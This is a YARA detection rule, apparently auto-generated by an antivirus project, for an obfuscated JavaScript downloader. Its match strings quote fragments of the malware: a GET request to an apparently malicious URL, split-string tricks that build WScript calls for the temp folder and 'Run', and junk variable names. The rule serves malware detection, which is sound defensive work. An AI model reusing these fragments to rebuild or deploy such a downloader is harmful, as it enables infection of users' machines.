rule sig_20160428_8658b18c6dbb7e9b10c18b6acc3bb8a0 {
  meta:
    description = "datamaliciousorder - file 20160428_8658b18c6dbb7e9b10c18b6acc3bb8a0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3fb83c376cd3544f99218f9b51e569e1299ecd1a53070245219631b4007c4de9"

  strings:
    $s1  = "ZlbIplLfxLxaClyLbdCbl[BaxKuqIzsZxjLzhMbqQpt](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function CnrAwiMeiMqfJxwRztNrm() {return LgyQinSavYccLagGttMdq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function XswJxlDpeNlpHtlKkuOdt(PcbRfsTmzYhwBpoZkoZqw){LgyQinSavYccLagGttMdq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function XswJxlDpeNlpHtlKkuOdt(PcbRfsTmzYhwBpoZkoZqw){LgyQinSavYccLagGttMdq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "var LgyQinSavYccLagGttMdq = function JtiAodMlbWhjZtlLhbAiu() {return RsvVndXyaBxgAlfXdmZyt[BweMoiSgyEscMlvOjmYmi](\"WScript\"+\"" ascii
    $s6  = "return MqwXwvLhwOsvUhkZvzWld - KmmTojJedLpoOkpXltTtx;};" fullword ascii
    $s7  = "function SqjNvkNlhEyzQzdRefSch(MqwXwvLhwOsvUhkZvzWld, KmmTojJedLpoOkpXltTtx){HztQvoQfuRteMbfUisZbo = HztQvoQfuRteMbfUisZbo * 1; " ascii
    $s8  = "var LgyQinSavYccLagGttMdq = function JtiAodMlbWhjZtlLhbAiu() {return RsvVndXyaBxgAlfXdmZyt[BweMoiSgyEscMlvOjmYmi](\"WScript\"+\"" ascii
    $s9  = "var RsvVndXyaBxgAlfXdmZyt = this[\"WScript\"];" fullword ascii
    $s10 = "function CnrAwiMeiMqfJxwRztNrm() {return LgyQinSavYccLagGttMdq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (ZlbIplLfxLxaClyLbdCbl[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function SqjNvkNlhEyzQzdRefSch(MqwXwvLhwOsvUhkZvzWld, KmmTojJedLpoOkpXltTtx){HztQvoQfuRteMbfUisZbo = HztQvoQfuRteMbfUisZbo * 1; " ascii
    $s13 = "function DhzKcbWgaIfqFomJbnQak() {return ((TltJsaPlzSkkKogDijCws == true) && (TltJsaPlzSkkKogDijCws == AhjLobTpwJfoOomUwtVhl)) ?" ascii
    $s14 = "function DhzKcbWgaIfqFomJbnQak() {return ((TltJsaPlzSkkKogDijCws == true) && (TltJsaPlzSkkKogDijCws == AhjLobTpwJfoOomUwtVhl)) ?" ascii
    $s15 = "var WvcTorXnjJfwXtfMibGxl = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "}while (FkjGfhNtxSvmQwnHrpJcy);" fullword ascii
    $s17 = "function RquXpvCegNwsSjbHowKnl(PdsRxvPfwFohLpvWymKok) {var OdvGfjPoiIkgJfiBjnBtk = (1, 2, 3, 4, 5, PdsRxvPfwFohLpvWymKok); retur" ascii
    $s18 = "function XnpQwsYtfWcaAxnCdtHau(){return WbcIrvGgiUucBnuBebQmx + \"\";};" fullword ascii
    $s19 = "function RquXpvCegNwsSjbHowKnl(PdsRxvPfwFohLpvWymKok) {var OdvGfjPoiIkgJfiBjnBtk = (1, 2, 3, 4, 5, PdsRxvPfwFohLpvWymKok); retur" ascii
    $s20 = "var TltJsaPlzSkkKogDijCws = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}